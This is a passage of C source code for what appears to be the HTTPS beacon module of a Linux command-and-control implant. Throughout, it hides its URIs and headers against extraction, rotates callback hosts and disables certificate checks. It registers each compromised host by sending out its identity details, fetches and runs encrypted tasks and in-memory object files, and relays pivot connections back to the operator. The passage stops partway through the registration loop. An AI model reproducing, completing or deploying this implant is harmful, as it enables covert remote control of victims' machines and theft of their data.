/* nax_linux/src/Transport/https.c — libcurl backend
 *
 * Replaces the hand-rolled OpenSSL/HTTP implementation.
 * All external symbols and behaviour are preserved:
 *   - volatile-write string init  (NAX_URI_GET_WRITE / NAX_UA_WRITE / …)
 *   - profile rotate (nax_profile_*)
 *   - proxy detection via env vars (https_proxy / HTTPS_PROXY / http_proxy / HTTP_PROXY)
 *   - pre-profile POST  (X-Beacon-Id header, body raw)
 *   - post-profile GET/POST (nax_encode_* / nax_build_request_headers / nax_decode_server_output)
 *   - nax_send_tunnel_result()  — called from tunnel.c
 *   - nax_https_main()          — agent entry point
 *   - sleep obfuscation with memfd key
 *
 * Build:  add -DNAX_HTTPS_MODE and link -lcurl (replaces -lssl -lcrypto).
 */

#ifdef NAX_HTTPS_MODE

#include "nax_linux.h"
#include "opsec.h"
#include "nax_bof_sdk.h"

#include <curl/curl.h>

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <poll.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <time.h>
#include <signal.h>
#include <sys/mman.h>
#include <pthread.h>

#ifdef __has_include
#  if __has_include("nax_config.h")
#    include "nax_config.h"
#  endif
#endif

/* ===== compile-time defaults (volatile-write anti-extraction) ===== */
char g_uri_get[64];
char g_uri_post[64];
static char g_user_agent[256];
char g_beacon_hdr[32];
char g_public_hdr[32];
static int  g_strings_init = 0;

static void nax_https_init_strings(void)
{
    if (g_strings_init) return;
    g_strings_init = 1;

#ifdef NAX_URI_GET_WRITE
    { volatile char *p = (volatile char *)g_uri_get;    NAX_URI_GET_WRITE(p);    }
    { volatile char *p = (volatile char *)g_uri_post;   NAX_URI_POST_WRITE(p);   }
    { volatile char *p = (volatile char *)g_user_agent; NAX_UA_WRITE(p);         }
    { volatile char *p = (volatile char *)g_beacon_hdr; NAX_BEACON_HDR_WRITE(p); }
    { volatile char *p = (volatile char *)g_public_hdr; NAX_PUBLIC_HDR_WRITE(p); }
#else
    g_uri_get[0]='/'; g_uri_get[1]='n'; g_uri_get[2]='e'; g_uri_get[3]='w';
    g_uri_get[4]='s'; g_uri_get[5]='/'; g_uri_get[6]='f'; g_uri_get[7]='e';
    g_uri_get[8]='e'; g_uri_get[9]='d';
    g_uri_post[0]='/'; g_uri_post[1]='a'; g_uri_post[2]='p'; g_uri_post[3]='i';
    g_uri_post[4]='/'; g_uri_post[5]='s'; g_uri_post[6]='u'; g_uri_post[7]='b';
    g_uri_post[8]='m'; g_uri_post[9]='i'; g_uri_post[10]='t';
    g_beacon_hdr[0]='X'; g_beacon_hdr[1]='-'; g_beacon_hdr[2]='B'; g_beacon_hdr[3]='e';
    g_beacon_hdr[4]='a'; g_beacon_hdr[5]='c'; g_beacon_hdr[6]='o'; g_beacon_hdr[7]='n';
    g_beacon_hdr[8]='-'; g_beacon_hdr[9]='I'; g_beacon_hdr[10]='d';
    g_public_hdr[0]='X'; g_public_hdr[1]='-'; g_public_hdr[2]='N'; g_public_hdr[3]='a';
    g_public_hdr[4]='X'; g_public_hdr[5]='-'; g_public_hdr[6]='P'; g_public_hdr[7]='u';
    g_public_hdr[8]='b'; g_public_hdr[9]='l'; g_public_hdr[10]='i'; g_public_hdr[11]='c';
    g_user_agent[0]='M'; g_user_agent[1]='o'; g_user_agent[2]='z';
#endif
}

#ifndef NAX_C2_PORT
#  define NAX_C2_PORT 443
#endif

/* ===== NaxSysInfo forward (defined in sysinfo.c) ===== */
typedef struct {
    char     hostname[256]; char     username[128];
    char     ip[64];        char     domain[64];
    char     procname[256]; char     imgpath[512];
    char     osver[64];
    uint32_t pid;  uint32_t tid; uint32_t ppid;
    uint32_t os_major; uint32_t os_minor; uint16_t os_build;
    uint8_t  elevated;
} NaxSysInfo;

/* ===== extern functions ===== */
extern int nax_encrypt(const uint8_t *key, const uint8_t *plain, uint32_t plain_len,
                        uint8_t *out, uint32_t *out_len);
extern int nax_decrypt(const uint8_t *key, const uint8_t *enc, uint32_t enc_len,
                        uint8_t *out, uint32_t *out_len);
extern int nax_build_result(uint32_t task_id, uint8_t status,
                             const uint8_t *data, uint32_t data_len,
                             uint8_t *frame, uint32_t *frame_len);
extern int nax_build_heartbeat(uint8_t *out, uint32_t *out_len);
extern int nax_frame_encode(uint8_t msg_type, const uint8_t *body, uint32_t body_len,
                             uint8_t *out, uint32_t *out_len);
extern int nax_frame_decode(const uint8_t *frame, uint32_t frame_len,
                             uint8_t *msg_type, uint8_t **body, uint32_t *body_len);
extern int nax_decode_task(const uint8_t *body, uint32_t body_len, NaxTask *t);
extern uint8_t nax_dispatch(NaxAgent *a, NaxTask *task,
                              uint8_t **result, uint32_t *result_len);
extern void nax_process_tunnels(NaxAgent *a);
extern uint32_t nax_process_tunnels_ex(NaxAgent *a, uint8_t *out, uint32_t out_cap);
extern int nax_build_reg_body(
    const char *hn, uint32_t hn_len, const char *un, uint32_t un_len,
    uint8_t arch, uint32_t pid, uint32_t sleep_ms, uint32_t tid,
    const char *ip, uint32_t ip_len, const char *dom, uint32_t dom_len,
    const char *proc, uint32_t proc_len, uint8_t elevated,
    uint32_t os_major, uint32_t os_minor, uint16_t os_build,
    uint32_t parent_pid, uint32_t acp, uint32_t oem_cp,
    const char *img, uint32_t img_len,
    uint8_t *out, uint32_t *out_len);
extern void nax_gather_sysinfo(NaxSysInfo *info);

/* ===== profile functions (https_profile.c) ===== */
extern void        nax_apply_profile(const uint8_t *data, uint32_t data_len);
extern const char *nax_profile_beacon_hdr(void);
extern const char *nax_profile_get_uri(void);
extern const char *nax_profile_post_uri(void);
extern int         nax_profile_loaded(void);
extern int         nax_is_empty_resp(const uint8_t *data, uint32_t data_len);
extern uint8_t     nax_profile_rotation(void);
extern const char *nax_profile_get_uri_rotate(void);
extern const char *nax_profile_post_uri_rotate(void);
extern uint8_t     nax_profile_callbacks_count(void);
extern int         nax_profile_callback_host(uint8_t idx, char *host, uint16_t *port);
extern uint32_t    nax_encode_get_meta(const uint8_t *body, uint32_t body_len,
                                          char *out_buf, uint32_t out_cap);
extern uint32_t    nax_encode_post_meta(const uint8_t *body, uint32_t body_len,
                                         char *out_buf, uint32_t out_cap);
extern uint32_t    nax_encode_post_output(const uint8_t *body, uint32_t body_len,
                                           char *out_buf, uint32_t out_cap);
extern uint32_t    nax_build_request_headers(const char *sid,
                                              const char *meta_enc, uint32_t meta_enc_len,
                                              int is_get,
                                              char *hdr_buf, uint32_t hdr_cap);
extern uint32_t    nax_decode_server_output(const uint8_t *enc, uint32_t enc_len,
                                             int is_get,
                                             uint8_t *out, uint32_t out_cap);
extern void nax_profile_xor(const uint8_t *key, uint32_t key_len);
extern int  nax_profile_apply_pending(void);

/* ===== global mutex — libcurl handles are not shared ===== */
static pthread_mutex_t g_https_mutex = PTHREAD_MUTEX_INITIALIZER;

/* ===== callback host rotation (same logic as original) ===== */
static uint8_t  g_host_idx  = 0;
static char     g_cur_host[256] = {0};
static uint16_t g_cur_port  = 0;

#ifdef NAX_CB_HOST_COUNT
static void nax_get_compiled_host(uint8_t idx, char *host, uint16_t *port)
{
    uint8_t port_buf[2] = {0};
    switch (idx) {
#  ifdef NAX_CB_HOST_0_WRITE
    case 0: { volatile char *h=(volatile char*)host; NAX_CB_HOST_0_WRITE(h);
              volatile uint8_t *p=(volatile uint8_t*)port_buf; NAX_CB_PORT_0_WRITE(p); } break;
#  endif
#  ifdef NAX_CB_HOST_1_WRITE
    case 1: { volatile char *h=(volatile char*)host; NAX_CB_HOST_1_WRITE(h);
              volatile uint8_t *p=(volatile uint8_t*)port_buf; NAX_CB_PORT_1_WRITE(p); } break;
#  endif
#  ifdef NAX_CB_HOST_2_WRITE
    case 2: { volatile char *h=(volatile char*)host; NAX_CB_HOST_2_WRITE(h);
              volatile uint8_t *p=(volatile uint8_t*)port_buf; NAX_CB_PORT_2_WRITE(p); } break;
#  endif
#  ifdef NAX_CB_HOST_3_WRITE
    case 3: { volatile char *h=(volatile char*)host; NAX_CB_HOST_3_WRITE(h);
              volatile uint8_t *p=(volatile uint8_t*)port_buf; NAX_CB_PORT_3_WRITE(p); } break;
#  endif
    default: break;
    }
    *port = (uint16_t)port_buf[0] | ((uint16_t)port_buf[1] << 8);
}
#endif /* NAX_CB_HOST_COUNT */

static void https_rotate_host(NaxAgent *a)
{
    uint8_t count = nax_profile_callbacks_count();
    if (count > 0) {
        uint8_t rotation = nax_profile_rotation();
        if (rotation == 1) {
            FILE *f = fopen("/dev/urandom", "rb");
            uint8_t r = 0;
            if (f) { fread(&r, 1, 1, f); fclose(f); }
            g_host_idx = r % count;
        }
        char host[256] = {0}; uint16_t port = 0;
        if (nax_profile_callback_host(g_host_idx, host, &port) == 0) {
            strncpy(g_cur_host, host, sizeof(g_cur_host) - 1);
            g_cur_port = port;
        }
        if (rotation != 1)
            g_host_idx = (g_host_idx + 1) % count;
        return;
    }

#ifdef NAX_CB_HOST_COUNT
    uint8_t cb_count = NAX_CB_HOST_COUNT;
    if (cb_count > 0) {
        char host[256] = {0}; uint16_t port = 0;
        nax_get_compiled_host(g_host_idx, host, &port);
        if (host[0]) {
            strncpy(g_cur_host, host, sizeof(g_cur_host) - 1);
            g_cur_port = port;
        }
        g_host_idx = (g_host_idx + 1) % cb_count;
        return;
    }
#endif
    strncpy(g_cur_host, a->cfg.c2_host, sizeof(g_cur_host) - 1);
    g_cur_port = (uint16_t)a->cfg.c2_port;
}

/* ===== session ID (identical to tcp.c / original https.c) ===== */
static void gen_session_id(char *out)
{
    uint8_t raw[8] = {0};
    char hostname[64] = {0};
    gethostname(hostname, sizeof(hostname) - 1);
    for (size_t i = 0; i < strlen(hostname) && i < 8; i++)
        raw[i] ^= (uint8_t)hostname[i];
    {
        struct ifreq ifr; struct ifconf ifc; char buf[1024];
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock >= 0) {
            ifc.ifc_len = sizeof(buf); ifc.ifc_buf = buf;
            if (ioctl(sock, SIOCGIFCONF, &ifc) == 0) {
                struct ifreq *it  = ifc.ifc_req;
                struct ifreq *end = it + (ifc.ifc_len / sizeof(*it));
                for (; it != end; ++it) {
                    strncpy(ifr.ifr_name, it->ifr_name, IFNAMSIZ - 1);
                    if (ioctl(sock, SIOCGIFFLAGS, &ifr) != 0) continue;
                    if (ifr.ifr_flags & IFF_LOOPBACK)  continue;
                    if (!(ifr.ifr_flags & IFF_UP))      continue;
                    if (ioctl(sock, SIOCGIFHWADDR, &ifr) != 0) continue;
                    uint8_t *mac = (uint8_t *)ifr.ifr_hwaddr.sa_data;
                    for (int i = 0; i < 6 && i < 8; i++) raw[i] ^= mac[i];
                    break;
                }
            }
            close(sock);
        }
    }
    int all_zero = 1;
    for (int i = 0; i < 8; i++) if (raw[i]) { all_zero = 0; break; }
    if (all_zero) {
        FILE *f = fopen("/dev/urandom", "rb");
        if (f) { fread(raw, 1, 8, f); fclose(f); }
    }
    raw[4] ^= (uint8_t)(getpid() & 0xFF);
    raw[5] ^= (uint8_t)((getpid() >> 8) & 0xFF);
    raw[6] ^= 0xC0;
    raw[7] ^= (uint8_t)(NAX_C2_PORT & 0xFF);
    static const char hex[] = "0123456789abcdef";
    for (int i = 0; i < 8; i++) {
        out[i*2]   = hex[(raw[i] >> 4) & 0xF];
        out[i*2+1] = hex[raw[i] & 0xF];
    }
    out[16] = '\0';
}

/* ===== libcurl response buffer ===== */
typedef struct {
    uint8_t *data;
    size_t   size;
} curl_buf_t;

static size_t curl_write_cb(void *ptr, size_t sz, size_t nmemb, void *userdata)
{
    curl_buf_t *b = (curl_buf_t *)userdata;
    size_t total  = sz * nmemb;
    uint8_t *tmp  = (uint8_t *)realloc(b->data, b->size + total);
    if (!tmp) return 0;
    b->data = tmp;
    memcpy(b->data + b->size, ptr, total);
    b->size += total;
    return total;
}

/* ===== build URL from current host/port + URI ===== */
static void build_url(const NaxAgent *a, const char *uri, char *url_out, size_t url_cap)
{
    const char *host = g_cur_host[0] ? g_cur_host : a->cfg.c2_host;
    uint16_t    port = g_cur_port    ? g_cur_port  : (uint16_t)a->cfg.c2_port;
    snprintf(url_out, url_cap, "https://%s:%u%s", host, (unsigned)port, uri);
}

/* ===== parse "Key: Value\r\n..." header blob into curl slist ===== */
/* nax_build_request_headers() returns a single buffer of HTTP header lines.
 * We split it and feed each line to curl_slist_append().
 * Lines with an empty value after the colon are skipped (curl rejects them). */
static struct curl_slist *headers_to_slist(const char *hdr_buf, uint32_t hdr_len)
{
    struct curl_slist *list = NULL;
    char tmp[4096];
    size_t cap = sizeof(tmp);

    const char *p   = hdr_buf;
    const char *end = hdr_buf + hdr_len;

    while (p < end) {
        /* Find end of line (\r\n or \n) */
        const char *nl = p;
        while (nl < end && *nl != '\n') nl++;
        size_t line_len = (size_t)(nl - p);
        if (nl < end) nl++; /* skip \n */

        /* Strip trailing \r */
        while (line_len > 0 && p[line_len - 1] == '\r') line_len--;

        if (line_len == 0) { p = nl; continue; }
        if (line_len >= cap) { p = nl; continue; }

        memcpy(tmp, p, line_len);
        tmp[line_len] = '\0';
        list = curl_slist_append(list, tmp);
        p = nl;
    }
    return list;
}

/* ===== core libcurl request helper ===== */
/*
 * is_get   : 1 = GET (heartbeat), 0 = POST (result/register)
 * extra_hdrs: raw "Key: Value\r\n" header block (may be NULL)
 * extra_len : byte length of extra_hdrs block
 * post_body / post_len : POST body (ignored when is_get=1)
 *
 * Returns allocated buffer with response body (caller must free).
 * *out_len = response byte count, or UINT32_MAX on network/HTTP error.
 */
static uint8_t *curl_do_request(NaxAgent *a,
                                 const char *url,
                                 int is_get,
                                 const char *extra_hdrs, uint32_t extra_len,
                                 const uint8_t *post_body, uint32_t post_len,
                                 uint32_t *out_len)
{
    *out_len = UINT32_MAX;

    CURL *curl = curl_easy_init();
    if (!curl) return NULL;

    curl_buf_t resp = {NULL, 0};

    /* ── URL ── */
    curl_easy_setopt(curl, CURLOPT_URL, url);

    /* ── HTTP/2 — forzado, sin fallback a 1.1 ── */
    curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_2_0);

    /* ── TLS ── */
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

    /* SNI: set from current host (already embedded in URL, but be explicit) */
    {
        const char *sni = g_cur_host[0] ? g_cur_host : a->cfg.c2_host;
        curl_easy_setopt(curl, CURLOPT_SSL_OPTIONS, (long)0);
        /* CURLOPT_PINNEDPUBLICKEY not set — we trust blindly like the original */
        (void)sni; /* SNI is derived automatically from the hostname in the URL */
    }

    /* ── Proxy: leer explícitamente del entorno (misma prioridad que el original).
     * https_proxy > HTTPS_PROXY > http_proxy > HTTP_PROXY */
    {
        const char *proxy_url = getenv("https_proxy");
        if (!proxy_url) proxy_url = getenv("HTTPS_PROXY");
        if (!proxy_url) proxy_url = getenv("http_proxy");
        if (!proxy_url) proxy_url = getenv("HTTP_PROXY");
        if (proxy_url && proxy_url[0]) {
            curl_easy_setopt(curl, CURLOPT_PROXY, proxy_url);
            curl_easy_setopt(curl, CURLOPT_PROXYAUTH, CURLAUTH_BASIC | CURLAUTH_NTLM);
            DBG("proxy: %s", proxy_url);
        }
    }

    /* ── User-Agent ── */
    curl_easy_setopt(curl, CURLOPT_USERAGENT, g_user_agent[0] ? g_user_agent : "Mozilla/5.0");

    /* ── Timeout ── */
    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);

    /* ── Method + body ── */
    if (is_get) {
        curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
    } else {
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS,  (const char *)post_body);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)post_len);
    }

    /* ── Extra headers ── */
    struct curl_slist *hlist = NULL;
    /* Disable curl's default "Expect: 100-continue" on POST */
    hlist = curl_slist_append(hlist, "Expect:");

    if (extra_hdrs && extra_len > 0) {
        struct curl_slist *extra = headers_to_slist(extra_hdrs, extra_len);
        /* Merge: walk extra and append each node to hlist */
        struct curl_slist *node = extra;
        while (node) {
            hlist = curl_slist_append(hlist, node->data);
            node  = node->next;
        }
        curl_slist_free_all(extra);
    }

    if (hlist)
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, hlist);

    /* ── Response ── */
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, curl_write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &resp);

    /* ── Perform ── */
    CURLcode rc = curl_easy_perform(curl);

    if (hlist) curl_slist_free_all(hlist);

    if (rc != CURLE_OK) {
        DBG_ERR("curl error: %s", curl_easy_strerror(rc));
        curl_easy_cleanup(curl);
        if (resp.data) free(resp.data);
        return NULL;
    }

    long http_code = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
    curl_easy_cleanup(curl);

    if (http_code != 200) {
        DBG_ERR("HTTP %ld — discarding response", http_code);
        if (resp.data) free(resp.data);
        return NULL;
    }

    *out_len = (uint32_t)resp.size;
    return resp.data; /* caller must free; may be NULL with *out_len=0 (empty 200) */
}

/* ===== HTTP POST (pre-profile and post-profile) ===== */
static uint8_t *https_post(NaxAgent *a,
                             const uint8_t *body, uint32_t body_len,
                             int profile_active,
                             uint32_t *out_resp_len)
{
    /* Encode body per PostClientOutput */
    uint8_t *send_body = (uint8_t *)body;
    uint32_t send_len  = body_len;
    uint8_t *enc_body  = NULL;

    if (profile_active) {
        uint32_t enc_cap = (body_len + 4) * 2 + 1024;
        enc_body = (uint8_t *)malloc(enc_cap);
        if (enc_body) {
            uint32_t enc_len = nax_encode_post_output(body, body_len,
                                                       (char *)enc_body, enc_cap);
            if (enc_len > 0) { send_body = enc_body; send_len = enc_len; }
        }
    }

    /* Encode ClientMeta (session ID) for POST header */
    char meta_enc[2048] = {0};
    uint32_t meta_len = 0;
    if (profile_active) {
        meta_len = nax_encode_post_meta((const uint8_t *)a->session_id,
                                         (uint32_t)strlen(a->session_id),
                                         meta_enc, sizeof(meta_enc));
    }

    /* Build request header block */
    char hdrs[4096];
    uint32_t hdr_len;
    if (profile_active) {
        hdr_len = nax_build_request_headers(a->session_id,
                                             meta_enc, meta_len,
                                             0 /*POST*/, hdrs, sizeof(hdrs));
    } else {
        /* Pre-profile: minimal headers (beacon ID + public flag) */
        hdr_len = (uint32_t)snprintf(hdrs, sizeof(hdrs),
            "%s: %s\r\n"
            "Content-Type: application/octet-stream\r\n"
            "%s: 1\r\n",
            g_beacon_hdr, a->session_id,
            g_public_hdr);
    }

    const char *uri   = profile_active ? nax_profile_post_uri_rotate() : g_uri_post;
    char url[512];
    build_url(a, uri, url, sizeof(url));

    DBG("POST %s (profile=%d body=%u)", url, profile_active, send_len);

    pthread_mutex_lock(&g_https_mutex);
    uint8_t *resp = curl_do_request(a, url,
                                     0 /*POST*/,
                                     hdrs, hdr_len,
                                     send_body, send_len,
                                     out_resp_len);
    pthread_mutex_unlock(&g_https_mutex);

    if (enc_body) free(enc_body);

    /* Decode server output if profile active */
    if (resp && *out_resp_len > 0 && profile_active) {
        uint8_t *dec = (uint8_t *)malloc(*out_resp_len + 256);
        if (dec) {
            uint32_t dec_len = nax_decode_server_output(resp, *out_resp_len,
                                                          0 /*POST*/, dec,
                                                          *out_resp_len + 256);
            if (dec_len > 0) {
                free(resp); resp = dec; *out_resp_len = dec_len;
            } else {
                free(dec);
            }
        }
    }
    return resp;
}

/* ===== HTTP GET (heartbeat) ===== */
static uint8_t *https_get(NaxAgent *a,
                            const uint8_t *hb_enc, uint32_t hb_enc_len,
                            uint32_t *out_resp_len)
{
    /* Encode encrypted heartbeat per GetClientMeta */
    char meta_enc[4096] = {0};
    uint32_t meta_len = nax_encode_get_meta(hb_enc, hb_enc_len,
                                              meta_enc, sizeof(meta_enc));

    /* Build header block */
    char hdrs[4096];
    uint32_t hdr_len = nax_build_request_headers(a->session_id,
                                                   meta_enc, meta_len,
                                                   1 /*GET*/, hdrs, sizeof(hdrs));

    const char *uri = nax_profile_get_uri_rotate();
    char url[512];
    build_url(a, uri, url, sizeof(url));

    DBG("GET %s", url);

    pthread_mutex_lock(&g_https_mutex);
    uint8_t *resp = curl_do_request(a, url,
                                     1 /*GET*/,
                                     hdrs, hdr_len,
                                     NULL, 0,
                                     out_resp_len);
    pthread_mutex_unlock(&g_https_mutex);

    if (!resp) return NULL;

    /* Check EmptyResp (no tasks) */
    if (*out_resp_len > 0 && nax_is_empty_resp(resp, *out_resp_len)) {
        free(resp);
        *out_resp_len = 0;
        return NULL;
    }

    /* Decode server output */
    if (*out_resp_len > 0) {
        uint8_t *dec = (uint8_t *)malloc(*out_resp_len + 256);
        if (dec) {
            uint32_t dec_len = nax_decode_server_output(resp, *out_resp_len,
                                                          1 /*GET*/, dec,
                                                          *out_resp_len + 256);
            if (dec_len > 0) {
                free(resp); resp = dec; *out_resp_len = dec_len;
            } else {
                free(dec);
            }
        }
    }
    return resp;
}

/* ===== encrypt frame and POST as result ===== */
static int https_send_result(NaxAgent *a, uint32_t task_id, uint8_t status,
                              const uint8_t *data, uint32_t data_len)
{
    uint8_t *frame = (uint8_t *)malloc(NAX_IO_CAP);
    if (!frame) return -1;
    uint32_t frame_len = NAX_IO_CAP;
    if (nax_build_result(task_id, status, data, data_len, frame, &frame_len) < 0) {
        free(frame); return -1;
    }
    uint32_t enc_cap = frame_len + NAX_AES_IV + NAX_AES_BLOCK + 32;
    uint8_t *enc = (uint8_t *)malloc(enc_cap);
    if (!enc) { free(frame); return -1; }
    uint32_t enc_len = enc_cap;
    int rc = 0;
    if (nax_encrypt(a->cfg.aes_key, frame, frame_len, enc, &enc_len) < 0) {
        rc = -1;
    } else {
        uint32_t resp_len = 0;
        uint8_t *resp = https_post(a, enc, enc_len, nax_profile_loaded(), &resp_len);
        if (!resp) rc = -1;
        else free(resp);
    }
    free(frame); free(enc);
    return rc;
}

/* ===== nax_send_tunnel_result (called from tunnel.c) ===== */
int nax_send_tunnel_result(NaxAgent *a, const uint8_t *data, uint32_t data_len)
{
    return https_send_result(a, 0, NAX_STATUS_TUNNEL, data, data_len);
}

/* ===== process decrypted response frames ===== */
static int https_handle_frames(NaxAgent *a, const uint8_t *enc, uint32_t enc_len)
{
    int tasks_dispatched = 0;
    uint8_t *plain = (uint8_t *)malloc(enc_len + NAX_AES_BLOCK);
    if (!plain) return 0;
    uint32_t plain_len = enc_len + NAX_AES_BLOCK;
    if (nax_decrypt(a->cfg.aes_key, enc, enc_len, plain, &plain_len) < 0) {
        free(plain); return 0;
    }
    uint8_t *cur = plain; uint32_t rem = plain_len;
    while (rem >= NAX_FRAME_HDR) {
        uint8_t ft = 0; uint8_t *fb = NULL; uint32_t fbl = 0;
        if (nax_frame_decode(cur, rem, &ft, &fb, &fbl) < 0) break;
        uint32_t step = NAX_FRAME_HDR + fbl;
        if (step > rem) break;
        cur += step; rem -= step;

        if (ft == NAX_WIRE_PROFILE && fbl > 0) {
            nax_apply_profile(fb, fbl);
            continue;
        }
        if (ft == NAX_WIRE_NO_TASKS) break;
        if (ft != NAX_WIRE_TASK)     continue;

        tasks_dispatched++;

        NaxTask task;
        if (nax_decode_task(fb, fbl, &task) < 0) {
            DBG_ERR("nax_decode_task failed body_len=%u", fbl);
            continue;
        }

        extern const char *nax_cmd_name(uint8_t);
        DBG("→ task cmd=0x%02x (%s) id=%u args=%u",
            task.cmd_id, nax_cmd_name(task.cmd_id), task.task_id, task.args_len);

        uint8_t *result = NULL; uint32_t result_len = 0;
        int was_profile_update = (task.cmd_id == NAX_CMD_PROFILE_UPDATE);

        uint8_t status = nax_dispatch(a, &task, &result, &result_len);

        if (status == NAX_STATUS_OK)
            DBG_OK("cmd=0x%02x (%s) id=%u → OK result=%u",
                   task.cmd_id, nax_cmd_name(task.cmd_id), task.task_id, result_len);
        else if (status == NAX_STATUS_ASYNC)
            DBG("cmd=0x%02x (%s) id=%u → ASYNC", task.cmd_id, nax_cmd_name(task.cmd_id), task.task_id);
        else
            DBG_ERR("cmd=0x%02x (%s) id=%u → ERR 0x%02x result=%u",
                    task.cmd_id, nax_cmd_name(task.cmd_id), task.task_id, status, result_len);

        if (status != NAX_STATUS_ASYNC) {
            https_send_result(a, task.task_id, status, result, result_len);
            DBG_OK("result sent id=%u", task.task_id);
        }
        if (result) free(result);

        if (was_profile_update && a->pending_profile_data) {
            DBG("applying deferred profile (%u bytes)", a->pending_profile_len);
            nax_apply_profile(a->pending_profile_data, a->pending_profile_len);
            free(a->pending_profile_data);
            a->pending_profile_data = NULL;
            a->pending_profile_len  = 0;
            a->profile_pending = 1;
            DBG_OK("new profile active");
        }
    }
    free(plain);
    return tasks_dispatched;
}

/* ===== process_pivots ===== */
static int process_pivots(NaxAgent *a)
{
    int relayed = 0;
    NaxPivot **pp = &a->pivot_head;
    while (*pp) {
        NaxPivot *p = *pp;
        int broken  = 0;

        struct pollfd pfd = { .fd = p->sock, .events = POLLIN };
        while (1) {
            int pr = poll(&pfd, 1, 0);
            if (pr <= 0) break;
            if (!(pfd.revents & POLLIN)) break;

            uint8_t lenbuf[4]; ssize_t got = 0;
            while (got < 4) {
                ssize_t r = p->ssl ? SSL_read((SSL*)p->ssl, lenbuf + got, 4 - got) : recv(p->sock, lenbuf + got, 4 - got, 0);
                if (r <= 0) { broken = 1; break; }
                got += r;
            }
            if (broken) break;

            uint32_t msg_len = (uint32_t)lenbuf[0] | ((uint32_t)lenbuf[1] << 8) |
                               ((uint32_t)lenbuf[2] << 16) | ((uint32_t)lenbuf[3] << 24);
            if (msg_len == 0 || msg_len > 4 * 1024 * 1024) { broken = 1; break; }

            uint8_t *msg = (uint8_t *)malloc(msg_len);
            if (!msg) { broken = 1; break; }
            got = 0;
            while ((uint32_t)got < msg_len) {
                ssize_t r = p->ssl ? SSL_read((SSL*)p->ssl, msg + got, (int)(msg_len - (uint32_t)got)) : recv(p->sock, msg + got, msg_len - (uint32_t)got, 0);
                if (r <= 0) { free(msg); broken = 1; break; }
                got += r;
            }
            if (broken) break;

            uint32_t rd_len = 1 + 4 + 4 + msg_len;
            uint8_t *rd = (uint8_t *)malloc(rd_len);
            if (rd) {
                rd[0] = NAX_PIV_TYPE_DATA;
                rd[1] = (uint8_t)(p->pivot_id);       rd[2] = (uint8_t)(p->pivot_id >> 8);
                rd[3] = (uint8_t)(p->pivot_id >> 16); rd[4] = (uint8_t)(p->pivot_id >> 24);
                rd[5] = (uint8_t)(msg_len);            rd[6] = (uint8_t)(msg_len >> 8);
                rd[7] = (uint8_t)(msg_len >> 16);      rd[8] = (uint8_t)(msg_len >> 24);
                memcpy(rd + 9, msg, msg_len);
                if (https_send_result(a, 0, NAX_STATUS_OK, rd, rd_len) == 0)
                    relayed += (int)rd_len;
                free(rd);
            }
            free(msg);
        }

        if (broken) {
            uint8_t unlink_data[6];
            unlink_data[0] = NAX_PIV_TYPE_UNLINK;
            unlink_data[1] = (uint8_t)(p->pivot_id);       unlink_data[2] = (uint8_t)(p->pivot_id >> 8);
            unlink_data[3] = (uint8_t)(p->pivot_id >> 16); unlink_data[4] = (uint8_t)(p->pivot_id >> 24);
            unlink_data[5] = 2;
            https_send_result(a, 0, NAX_STATUS_OK, unlink_data, sizeof(unlink_data));
            if (p->ssl) { SSL_shutdown((SSL*)p->ssl); SSL_free((SSL*)p->ssl); }
            close(p->sock);
            *pp = p->next;
            free(p);
        } else {
            pp = &p->next;
        }
    }
    return relayed;
}

/* ===== async BOF drain ===== */
static void https_async_cb(uint32_t task_id, uint8_t status,
                            const char *output, uint32_t output_len,
                            void *user_data)
{
    NaxAgent *a = (NaxAgent *)user_data;
    https_send_result(a, task_id, status, (uint8_t *)output, output_len);
}

static void nax_https_drain_async(NaxAgent *a)
{
    nax_async_drain(https_async_cb, a);
}

/* ===== main agent loop ===== */
void nax_https_main(NaxAgent *a)
{
    nax_https_init_strings();
    signal(SIGPIPE, SIG_IGN);
    gen_session_id(a->session_id);

    /* libcurl global init (once per process) */
    curl_global_init(CURL_GLOBAL_ALL);

    nax_bof_sdk_init();

    NaxSysInfo info;
    nax_gather_sysinfo(&info);

    while (a->running) {
        /* ── Registration loop ── */
        https_rotate_host(a);
        int registered = 0;

        while (a->running && !registered) {
            uint8_t reg_body[4096]; uint32_t reg_body_len = sizeof(reg_body);
            if (nax_build_reg_body(
                    info.hostname, strlen(info.hostname),
                    info.username, strlen(info.username),
                    NAX_ARCH_CURRENT, info.pid, a->cfg.sleep_ms, info.tid,
                    info.ip, strlen(info.ip), info.domain, strlen(info.domain),
                    info.procname, strlen(info.procname), info.elevated,
                    info.os_major, info.os_minor, info.os_build,
                    info.ppid, 0, 0, info.imgpath, strlen(info.imgpath),
                    reg_body, &reg_body_len) < 0) { sleep(3); continue; }

            uint8_t *frame = (uint8_t *)malloc(NAX_IO_CAP);
            if (!frame) { sleep(3); continue; }
            uint32_t frame_len = NAX_IO_CAP;
            if (nax_frame_encode(NAX_WIRE_REGISTER, reg_body, reg_body_len,
                                 frame, &frame_len) < 0) { free(frame); sleep(3); continue; }

            uint32_t enc_cap = frame_len + NAX_AES_IV + NAX_AES_BLOCK + 32;
            uint8_t *enc = (uint8_t *)malloc(enc_cap);
            if (!enc) { free(frame); sleep(3); continue; }
            uint32_t enc_len = enc_cap;
            if (nax_encrypt(a->cfg.aes_key, frame, frame_len, enc, &enc_len) < 0) {
                free(frame); free(enc); sleep(3); continue;
            }
            free(frame);

